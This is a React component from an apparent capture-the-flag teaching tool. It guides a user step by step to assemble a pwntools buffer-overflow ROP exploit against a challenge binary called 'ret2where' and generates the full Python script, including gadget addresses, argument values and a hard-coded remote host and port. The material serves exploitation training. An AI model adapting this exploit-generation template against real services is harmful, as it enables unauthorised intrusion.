import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { toast } from "@/components/ui/use-toast";
import { ArrowLeft, ArrowRight } from 'lucide-react';

import PlatformStep from './script_builder_steps/PlatformStep';
import OffsetStep from './script_builder_steps/OffsetStep';
import ArgumentsStep from './script_builder_steps/ArgumentsStep';
import GadgetsStep from './script_builder_steps/GadgetsStep';

interface ScriptBuilderSectionProps {
  onScriptBuilt: (script: string) => void;
  onBack: () => void;
}

type Platform = 'local' | 'remote' | 'debug';
type Offset = 40 | 48 | 56 | 64;

const gadgetDetails = [
  { id: 'pop_rdi', address: '0x401199', instruction: 'pop rdi; ret', tooltip: 'Pops a value from the stack into RDI, then returns.' },
  { id: 'pop_rax', address: '0x4011a1', instruction: 'pop rax; ret', tooltip: 'Pops a value from the stack into RAX, then returns.' },
  { id: 'mov_rsi_rax', address: '0x40119b', instruction: 'mov rsi, rax; ret', tooltip: 'Moves the value from RAX into RSI, then returns. Useful when direct pop rsi is unavailable.' },
  { id: 'pop_rdx', address: '0x40119f', instruction: 'pop rdx; ret', tooltip: 'Pops a value from the stack into RDX, then returns.' },
  { id: 'call_surprise', address: '0x4011a6', instruction: 'call surprise_for_you', tooltip: 'Calls the target function to get the flag.' },
];

const ScriptBuilderSection = ({ onScriptBuilt, onBack }: ScriptBuilderSectionProps) => {
  const [currentStep, setCurrentStep] = useState(1);
  const [platform, setPlatform] = useState<Platform>('remote');
  const [offset, setOffset] = useState<Offset | null>(null);
  const [argRdi, setArgRdi] = useState<string | null>(null);
  const [argRsi, setArgRsi] = useState<string | null>(null);
  const [argRdx, setArgRdx] = useState<string | null>(null);
  const [selectedGadgets, setSelectedGadgets] = useState<string[]>([]);

  const handleNextStep = () => {
    if (currentStep === 1 && !platform) {
      toast({ title: "Error", description: "Please select a target platform.", variant: "destructive" });
      return;
    }
    if (currentStep === 2 && offset === null) {
       toast({ title: "Error", description: "Please select an offset.", variant: "destructive" });
      return;
    }
    if (currentStep === 3 && (!argRdi || !argRsi || !argRdx)) {
      toast({ title: "Error", description: "Please select all argument values.", variant: "destructive" });
      return;
    }
    // Step 4 validation for gadgets will happen in buildAndSubmitScript
    if (currentStep < 4) {
      setCurrentStep(prev => prev + 1);
    } else { // Current step is 4, next action is to build script
      buildAndSubmitScript();
    }
  };

  const handlePrevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(prev => prev - 1);
    } else {
      onBack(); // Go back from step 1
    }
  };

  const handleGadgetToggle = (gadgetId: string) => {
    setSelectedGadgets(prev =>
      prev.includes(gadgetId) ? prev.filter(g => g !== gadgetId) : [...prev, gadgetId]
    );
  };

  const buildAndSubmitScript = () => {
    // Validation for correct choices as per challenge design
    if (offset !== 56) {
        toast({ title: "Incorrect Offset", description: "The offset to overwrite RIP is 56 for this challenge. Please correct your selection.", variant: "destructive"});
        setCurrentStep(2);
        return;
    }
    if (argRdi !== '0xcafebabe' || argRsi !== '0xdeadbeef' || argRdx !== '0xc0ffee') {
        toast({ title: "Incorrect Argument Values", description: "One or more function arguments are incorrect. Review the Ghidra output for `surprise_for_you` function.", variant: "destructive"});
        setCurrentStep(3);
        return;
    }
    
    const requiredGadgetIds = ['pop_rdi', 'pop_rax', 'mov_rsi_rax', 'pop_rdx', 'call_surprise'];
    const missingGadgets = requiredGadgetIds.filter(id => !selectedGadgets.includes(id));
    if (missingGadgets.length > 0) {
        const missingGadgetNames = missingGadgets.map(id => gadgetDetails.find(g => g.id === id)?.instruction || id);
        toast({ title: "Missing Critical Gadgets", description: `You are missing essential ROP gadgets: ${missingGadgetNames.join(', ')}. Please select all required gadgets.`, variant: "destructive"});
        setCurrentStep(4);
        return;
    }
    // Ensure all required gadgets are selected (already handled by the check above)
    // If any selected gadget is not part of requiredGadgetIds (i.e. an extra, incorrect gadget was chosen)
    const extraGadgets = selectedGadgets.filter(id => !requiredGadgetIds.includes(id));
    if (extraGadgets.length > 0) {
        const extraGadgetNames = extraGadgets.map(id => gadgetDetails.find(g => g.id === id)?.instruction || id);
        toast({ title: "Incorrect Gadgets Selected", description: `You have selected some unnecessary or incorrect gadgets: ${extraGadgetNames.join(', ')}. Please review your choices.`, variant: "destructive"});
        setCurrentStep(4);
        return;
    }


    let script = `from pwn import *\n\n`;
    if (platform === 'remote') {
      script += `p = remote('5.223.62.57', 5001)\n`;
    } else if (platform === 'local') {
      script += `p = process('./ret2where') # Assuming local binary name is ret2where\n`;
    } else { // debug
      script += `p = gdb.debug('./ret2where', gdbscript='''\n    b main\n    continue\n''') # Basic GDB script\n`;
    }

    script += `\noffset = ${offset}\n\n`;
    
    // Constructing ROP chain based on validated correct choices and user's specified format
    script += `rop_chain = [\n`;
    script += `    ${gadgetDetails.find(g=>g.id === 'pop_rdi')?.address},   # pop rdi; ret\n`;
    script += `    ${argRdi},          # RDI value (${argRdi})\n`;
    script += `    ${gadgetDetails.find(g=>g.id === 'pop_rax')?.address},   # pop rax; ret\n`;
    script += `    ${argRsi},          # RAX value (for RSI) (${argRsi})\n`; // This will be moved to RSI via mov_rsi_rax
    script += `    ${gadgetDetails.find(g=>g.id === 'mov_rsi_rax')?.address}, # mov rsi, rax; ret\n`;
    script += `    ${gadgetDetails.find(g=>g.id === 'pop_rdx')?.address},   # pop rdx; ret\n`;
    script += `    ${argRdx},          # RDX value (${argRdx})\n`;
    script += `    ${gadgetDetails.find(g=>g.id === 'call_surprise')?.address}  # call surprise_for_you\n`;
    script += `]\n\n`;

    script += `payload = b'A' * offset\n`;
    script += `for addr in rop_chain:\n`;
    script += `    payload += p64(addr)\n\n`;
    script += `p.sendline(payload)\n`;
    script += `p.interactive()\n`;

    onScriptBuilt(script);
  };
  
  const commonButtonClass = "text-slate-100 border-sky-500 hover:bg-sky-700/50 hover:text-white";
  const primaryButtonClass = "bg-sky-600 hover:bg-sky-500 text-white";

  const totalSteps = 4; 
  const currentDisplayStep = Math.min(currentStep, totalSteps);

  return (
    <div className="p-4 md:p-8 animate-fade-in max-w-3xl mx-auto">
      <h2 className="text-2xl md:text-3xl font-semibold text-sky-300 mb-6 text-center">
        Build Your Exploit Script - Step {currentDisplayStep} of {totalSteps}
      </h2>

      {currentStep === 1 && (
        <PlatformStep platform={platform} onPlatformChange={setPlatform} />
      )}

      {currentStep === 2 && (
        <OffsetStep offset={offset} onOffsetChange={setOffset} />
      )}

      {currentStep === 3 && (
        <ArgumentsStep
          argRdi={argRdi} onArgRdiChange={setArgRdi}
          argRsi={argRsi} onArgRsiChange={setArgRsi}
          argRdx={argRdx} onArgRdxChange={setArgRdx}
        />
      )}

      {currentStep === 4 && (
        <GadgetsStep
          selectedGadgets={selectedGadgets}
          onGadgetToggle={handleGadgetToggle}
          gadgetDetails={gadgetDetails}
        />
      )}

      <div className="mt-8 flex justify-between items-center">
        <Button onClick={handlePrevStep} variant="outline" className={commonButtonClass}>
          <ArrowLeft size={20} className="mr-1" />
          {currentStep === 1 ? 'Back to Analysis Methods' : 'Previous Step'}
        </Button>
        <Button onClick={handleNextStep} className={primaryButtonClass}>
          {currentStep === totalSteps ? 'Build Script' : 'Next Step'}
          <ArrowRight size={20} className="ml-1" />
        </Button>
      </div>
    </div>
  );
};

export default ScriptBuilderSection;
